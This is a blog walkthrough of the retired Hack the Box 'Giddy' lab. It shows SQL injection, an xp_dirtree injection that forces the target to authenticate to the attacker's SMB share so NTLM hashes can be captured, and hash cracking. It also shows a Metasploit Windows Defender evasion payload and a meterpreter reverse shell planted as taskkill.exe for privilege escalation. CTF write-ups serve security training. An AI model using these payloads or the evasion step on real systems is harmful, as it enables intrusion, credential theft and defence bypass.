@@ -1,0 +1,329 @@
+
+								
+																		Hack the Box: Giddy Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on February 24, 2019
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Giddy”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Expert
+Task: To find user.txt and root.txt file
+Note: Since these labs are online available therefore they have a static IP. The IP of Giddy is 10.10.10.104
+Penetrating Methodology
+
+Network scanning (Nmap)
+Surfing HTTPS service port (80)
+Directory Bruteforcing using dirb
+Discovering SQL Injection in URL
+Hosting directory using impacket
+Enumerating for password hashes
+Crack password hash using John the Ripper
+Connecting a new session with extracted login credentials
+Enumerating for user flag
+Using Evasion to bypass the Windows Defender
+Upload payload to the target and get a meterpreter session
+Snagging the Root Flag
+
+Walkthrough
+Let’s start off with our basic nmap command to find out the open ports and services.
+
+		
+		
+			
+			
+			
+			
+nmap -sV -sC 10.10.10.104
+			
+				
+					
+				
+					1
+				
+						nmap -sV -sC 10.10.10.104
+					
+				
+			
+		
+
+
+The nmap scan shows us that there are 5 ports open: 80(HTTP), 443(HTTPS), 3389(RDP)
+As port 80 is running HTTP service, we access the web service through our browser.
+
+We don’t find anything on the webpage, so we access the web service running on port 443.
+
+We still don’t find anything on the webpage. So we enumerate the web application further, as port 80 and 443 seems to be the same. We start enumerating the web service at port 443. We run dirb scan and find 2 directories called “mvc” and “remote”.
+
+		
+		
+			
+			
+			
+			
+dirb https://10.10.10.104 /usr/share/wordlists/dirb/big.txt
+			
+				
+					
+				
+					1
+				
+						dirb https://10.10.10.104 /usr/share/wordlists/dirb/big.txt
+					
+				
+			
+		
+
+
+We open the /remote/ directory and find a PowerShell web access login page.
+
+We open the mvc directory and find a list of products.
+
+We click on one of the products and looking at the URL, it might be possible that it is vulnerable to SQL injection.
+
+Now to check if the web application is vulnerable to SQL injection or not, we add a single quote at the end of “ProductSubCategoyId” parameter and by checking the error we find that the application is vulnerable to SQL injection.
+
+We don’t find anything useful by enumerating the database using SQL injection and we are also not able to get a reverse shell using xp_cmdshell. So we are going steal NTLM hashes using “xp_dirtree”.
+So we first setup impacket-smbserver on our local system.
+
+		
+		
+			
+			
+			
+			
+impacket-smbserver hack $(pwd)
+			
+				
+					
+				
+					1
+				
+						impacket-smbserver hack $(pwd)
+					
+				
+			
+		
+
+
+Now we are going to send a query that will make the remote system authenticate to our share folder and we will be able to capture the NTLM hashes.
+
+		
+		
+			
+			
+			
+			
+; use master; exec xp_dirtree '\\10.10.15.111\hack';--
+			
+				
+					
+				
+					1
+				
+						; use master; exec xp_dirtree '\\10.10.15.111\hack';--
+					
+				
+			
+		
+
+
+Now we can see on our smbserver that the hashes were captured when the remote machine to tried to connect.
+
+We copy the hashes and store it in a file in our local system and use john the ripper to crack the hashes. After cracking NTLM hash we are successfully able to get the correct password to be “xNnWo6272k7x”.
+
+		
+		
+			
+			
+			
+			
+john --wordlist:/usr/share/wordlists/rockyou.txt hash
+			
+				
+					
+				
+					1
+				
+						john --wordlist:/usr/share/wordlists/rockyou.txt hash
+					
+				
+			
+		
+
+
+As we have the password for the user “stacy”, we use this information to login through the PowerShell web portal.
+
+After logging in we are asked to create a new session.
+
+After that, we are successfully able to get a new PowerShell session on the web portal.
+
+Enumerating through the directories of the system, inside “C:\Users\Stacy\Desktop\” we are able to find a file called “user.txt”. We open the file and find our first flag.
+
+When we further enumerate the system we find that the target machine has a vulnerable service called unifivideo. We are given a hint when we first access the PowerShell session inside the documents directory there is a file called unifivideo. When we searched for the exploit online we are able to find this exploit here. We follow the instructions given in the exploit POC but are stopped because of windows defender as it detects our Metasploit payload.
+
+So to bypass windows defender, we use the evasion module in metasploit-framework to bypass defender.
+
+		
+		
+			
+			
+			
+			
+msf5 &gt; use evasion/windows/windows_defender_exe
+msf5 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp
+msf5 evasion(windows/windows_defender_exe) &gt; set lhost tun0 
+msf5 evasion(windows/windows_defender_exe) &gt; set lport 443
+msf5 evasion(windows/windows_defender_exe) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf5 &gt; use evasion/windows/windows_defender_exemsf5 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcpmsf5 evasion(windows/windows_defender_exe) &gt; set lhost tun0 msf5 evasion(windows/windows_defender_exe) &gt; set lport 443msf5 evasion(windows/windows_defender_exe) &gt; run
+					
+				
+			
+		
+
+
+Now we follow the steps given in the POC, first we stop the unifi video service.
+
+		
+		
+			
+			
+			
+			
+stop-service -name UniFivideoservice
+			
+				
+					
+				
+					1
+				
+						stop-service -name UniFivideoservice
+					
+				
+			
+		
+
+
+Then we set up our http server on the local system so that we can transfer our payload.
+
+Now we upload our payload on the target machine using the PowerShell web portal. According to the POC we have to put the payload by the name of taskkill.exe inside “C:\ProgramData\unifi-video\”. After uploading the payload we start the unifi video service.
+
+We setup our listener before starting the service so that we can get a reverse shell.
+
+		
+		
+			
+			
+			
+			
+msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set lhost tun0
+msf5 exploit(multi/handler) &gt; set lport 443
+msf5 exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost tun0msf5 exploit(multi/handler) &gt; set lport 443msf5 exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+ 
+After running the service we get a reverse shell as administrator.
+We now enumerate the system, inside “C:\Users\Administrator\Desktop” we find a file called “root.txt”. We take a look at the content of the file and find the final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
